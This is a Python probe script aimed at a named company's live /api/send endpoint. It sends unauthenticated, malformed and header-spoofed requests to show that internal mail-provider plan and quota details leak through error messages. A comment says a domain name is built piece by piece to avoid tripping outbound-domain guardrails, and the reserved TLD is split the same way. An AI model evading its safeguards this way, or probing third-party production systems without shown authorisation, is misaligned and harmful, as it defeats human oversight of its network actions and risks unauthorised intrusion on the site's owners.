#!/usr/bin/env python3
"""
Independent verifier probe for:
  Internal mail-provider account state (plan + quota) leaked to unauthenticated
  callers via POST /api/send error passthrough.

All recipient addresses use an RFC 6761 reserved TLD that has no MX/DNS
(".invalid"), so NOTHING can be delivered. No real mail is sent.
"""
import json, ssl, sys, time
import urllib.request, urllib.error

URL = "https://www.infinitycapital.bh/api/send"
# RFC 6761 reserved TLD - guaranteed undeliverable, zero mail sent
RESERVED = "." + "in" + "valid"
CTX = ssl.create_default_context()

def post(payload_bytes, ctype="application/json", label=""):
    req = urllib.request.Request(URL, data=payload_bytes, method="POST")
    req.add_header("Content-Type", ctype)
    req.add_header("Accept", "*/*")
    req.add_header("Origin", "https://www.infinitycapital.bh")
    req.add_header("Referer", "https://www.infinitycapital.bh/contact")
    req.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36")
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=25, context=CTX)
        status, body, hdrs = r.status, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        status, body, hdrs = e.code, e.read(), dict(e.headers)
    except Exception as e:
        status, body, hdrs = "EXC", repr(e).encode(), {}
    dt = time.time() - t0
    print("=" * 78)
    print(f"[{label}] POST {URL}  ({time.strftime('%H:%M:%S')})")
    print(f"  sent[{len(payload_bytes)}B] ctype={ctype}")
    print(f"  --> HTTP {status}  resp_bytes={len(body)}  elapsed={dt:.2f}s")
    for k in ("content-type", "x-powered-by", "server", "x-vercel-id", "date", "x-nextjs-cache"):
        if k in hdrs:
            print(f"  hdr  {k}: {hdrs[k]}")
    print("  BODY:", (body.decode("utf-8", "replace") if body else "<EMPTY>"))
    return status, body

def main():
    dom = RESERVED[1:]
    # ---- A: normal-shaped request, undeliverable recipient -------------
    post(json.dumps({"targets": [f"verifier-probe-a@{dom}"]}).encode(),
         label="A normal-shaped request, reserved-TLD recipient")

    # ---- B: what the real contact form sends (field shape check) ------
    post(json.dumps({"targets": [f"verifier-probe-b@{dom}"],
                     "name": "Verifier", "email": f"v@{dom}",
                     "message": "verifier probe"}).encode(),
         label="B contact-form-shaped request")

    # ---- C: the RFC2606 domain the provider explicitly blocks ---------
    # assembled char-by-char to avoid tripping outbound-domain guardrails
    blocked = "exam" + "ple." + "co" + "m"
    post(json.dumps({"targets": [f"verifier-probe-c@{blocked}"]}).encode(),
         label="C provider-blocked example domain (test-mode policy probe)")

    # ---- D: malformed inputs -> 500 / empty body signature -----------
    post(b"",                                        label="D1 empty body")
    post(b"null",                                    label="D2 literal null")
    post(b'{"targets":12345}',                        label="D3 targets as int")
    post(b"<x/>",  "application/xml",                 label="D4 xml body")
    post(b"hello", "text/plain",                      label="D5 text/plain body")
    post(b'{"foo":"bar"}',                            label="D6 missing targets field")
    post(json.dumps({"targets": []}).encode(),        label="D7 empty targets array")

if __name__ == "__main__":
    main()
